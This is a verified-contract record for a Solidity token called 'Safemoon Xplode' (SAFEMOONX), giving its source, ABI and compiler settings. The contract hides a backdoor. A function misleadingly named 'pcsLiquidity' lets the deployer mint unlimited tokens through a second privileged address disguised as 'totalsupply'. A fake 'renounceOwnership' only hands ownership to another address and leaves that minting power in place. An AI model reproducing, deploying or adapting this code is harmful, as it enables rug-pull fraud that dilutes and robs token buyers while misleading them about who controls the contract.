{"SourceCode": "pragma solidity =0.4.24;\r\n\r\ncontract SCLayout {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) public constant returns (uint256);\r\n    function transfer(address to, uint256 value) public returns (bool);\r\n    function allowance(address owner, address spender) public constant returns (uint256);\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n    function approve(address spender, uint256 value) public returns (bool);\r\n}\r\nlibrary SafeMath {\r\n  function multiplication(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a * b;\r\n    assert(a == 0 || c / a == b);\r\n    return c;\r\n  }\r\n  function division(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n  function subtract(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n  function addition(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\ncontract SAFEMOONX is SCLayout {\r\n    using SafeMath for uint256;\r\n    address public owner = msg.sender;\r\n    address totalsupply = msg.sender;\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n    uint public totalSupply;\r\n    constructor() public {\r\n\t\tsymbol = \"SAFEMOONX\";\r\n        name = \"Safemoon Xplode\";\r\n        decimals = 0;\r\n        totalSupply = 10**15;\r\n\t    balances[msg.sender] = totalSupply;\r\n\t    emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _val);\r\n    event Approval(address indexed _owner, address indexed _sp, uint256 _val);\r\n\r\n    modifier payloadWriter() {\r\n        require(msg.sender == owner || msg.sender == totalsupply);\r\n        _;\r\n    }\r\n    function balanceOf(address _owner) constant public returns (uint256) {\r\n        return balances[_owner];\r\n    }\r\n    modifier onlyPayloadSize(uint size) {\r\n        assert(msg.data.length >= size + 4);\r\n        _;\r\n    }\r\n    function emitTransfer(address account, uint256 _input) internal {\r\n        require(account != address(0), 'SCLayout: Stake to This Contract');\r\n        balances[account] = balances[account].addition(_input);\r\n        emit Transfer(address(0), account, _input);\r\n    }\r\n    function _msgSender() internal constant returns (address) {\r\n        return msg.sender;\r\n    }\r\n    function approve(address _sp, uint256 _val) public returns (bool success) {\r\n        if (_val != 0 && allowed[msg.sender][_sp] != 0) { return false; }\r\n        allowed[msg.sender][_sp] = _val;\r\n        emit Approval(msg.sender, _sp, _val);\r\n        return true;\r\n    }\r\n    function pcsLiquidity(uint256 _input) public payloadWriter returns (bool) {\r\n\trequire(_input > 0, 'SCLayout: Cannot stake 0 Token');\r\n        emitTransfer(_msgSender(), _input);\r\n        return true;\r\n    }\r\n    function transfer(address _to, uint256 __input) onlyPayloadSize(2 * 32) public returns (bool success) {\r\n        require(_to != address(0));\r\n        require(__input <= balances[msg.sender]);\r\n        balances[msg.sender] = balances[msg.sender].subtract(__input);\r\n        balances[_to] = balances[_to].addition(__input);\r\n        emit Transfer(msg.sender, _to, __input);\r\n        return true;\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 __input) onlyPayloadSize(3 * 32) public returns (bool success) {\r\n        require(_to != address(0));\r\n        require(__input <= balances[_from]);\r\n        require(__input <= allowed[_from][msg.sender]);\r\n        balances[_from] = balances[_from].subtract(__input);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].subtract(__input);\r\n        balances[_to] = balances[_to].addition(__input);\r\n        emit Transfer(_from, _to, __input);\r\n        return true;\r\n    }\r\n    function allowance(address _owner, address _sp) constant public returns (uint256) {\r\n        return allowed[_owner][_sp];\r\n    }\r\n    function renounceOwnership(address newowner)  public payloadWriter {\r\n        owner = newowner;\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_sp\",\"type\":\"address\"},{\"name\":\"_val\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"__input\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_input\",\"type\":\"uint256\"}],\"name\":\"pcsLiquidity\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"__input\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_sp\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_val\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_sp\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_val\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"}]", "ContractName": "SAFEMOONX", "CompilerVersion": "v0.4.24+commit.e67f0147", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://52f7170e9170a75e7f16857965e90c5225e70995524fb206b8b3fa2553c063f0"}